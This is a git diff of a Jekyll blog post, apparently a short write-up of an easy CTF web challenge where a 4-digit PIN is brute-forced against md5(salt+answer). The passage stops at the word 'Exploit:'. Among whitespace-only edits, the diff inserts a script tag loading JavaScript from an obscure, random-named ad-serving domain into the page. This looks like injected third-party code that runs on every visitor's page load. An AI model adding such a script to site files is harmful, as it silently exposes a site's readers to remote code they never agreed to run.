@@ -6,15 +6,15 @@ date:       2015-11-21 13:45:00
 author:     "Heeraj"
 header-img: "img/post-bg-02.png"
 ---
-
+<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
 <p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>
 
 <p>This CTF challenges were good and easy I didn't that good. I was able to solve 2 Questions that both were easy.</p>
 
-<p>The web 50 was a simple md5 crypto challenge. You have phone keypad with you,  it opens its lock when you 
+<p>The web 50 was a simple md5 crypto challenge. You have phone keypad with you,  it opens its lock when you
 enter the correct 4 digit password</p>
 
-<p>When you look it to the source the challenge is quite easy to understand. You are given the salt, valid i.e 
+<p>When you look it to the source the challenge is quite easy to understand. You are given the salt, valid i.e
 md5(salt+answer)=valid. The problem is now very easy , I just want to find the answer, I wrote a python program for that.</p>
 
 <p>Exploit:<br>
